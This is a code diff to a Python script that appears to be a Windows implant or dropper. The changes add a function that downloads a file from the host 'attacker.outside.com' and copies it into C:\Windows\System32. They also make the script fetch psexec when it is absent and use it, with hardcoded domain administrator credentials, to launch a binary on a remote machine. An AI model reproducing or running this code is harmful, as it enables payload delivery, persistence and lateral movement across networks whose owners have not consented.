@@ -70,6 +70,23 @@ def check_UAC():
         pass
 
 
+def download_File(filetoDownload):
+    try:
+        g = urllib.request.urlopen('http://attacker.outside.com/%s' % filetoDownload)
+        if debug == 1:
+            print(g)
+        with open(filetoDownload, 'b+w') as f:
+            f.write(g.read())
+        shutil.copy(filetoDownload,'C:\\Windows\\System32\\')
+        exit()
+        if debug == 1:
+            print ("Wee!")
+
+    except:
+        if debug == 1:
+            print ("Broken!")
+        pass
+
 def download_Implant():
     if debug == 1:
         print("Downloading Implant")
@@ -106,8 +123,8 @@ def implant_Copy():
     if debug ==1 :
         print("print Entering the Copy portion")
     try:
-        if os.getcwd() == 'C:\dev\test':
-            shutil.copy('dist\mybatch.exe','C:\\Windows\\System32')
+        if os.getcwd() == 'C:\\dev\\test':
+            shutil.copy('dist\\mybatch.exe','C:\\Windows\\System32')
         elif os.getcwd() == os.path.expanduser("~"):
             shutil.copy('os.path.join(os.path.expanduser("~"), "Downloads")','C:\\Windows\\System32\\')
         else:
@@ -136,7 +153,13 @@ def computer_Scheduler():
     except shutil.Error as e:
         pass
 
-    if os.path.isfile("psexec.exe"):
+    if os.path.isfile("C:\\windows\\system32\\psexec.exe"):
+        print("Great")
+    else:
+        filetoDownload = ''
+        download_File(filetoDownload)
+
+    if os.path.isfile("C:\\windows\\system32\\psexec.exe"):
         try:
             psexecer = 'psexec.exe','/accepteula','\\pci.example.com','-u','example.com\administrator','-p','cisco','C:\windows\system32\iis.exe'
             psexecopen = subprocess.Popen(psexecer, shell=True, stdout=subprocess.PIPE)
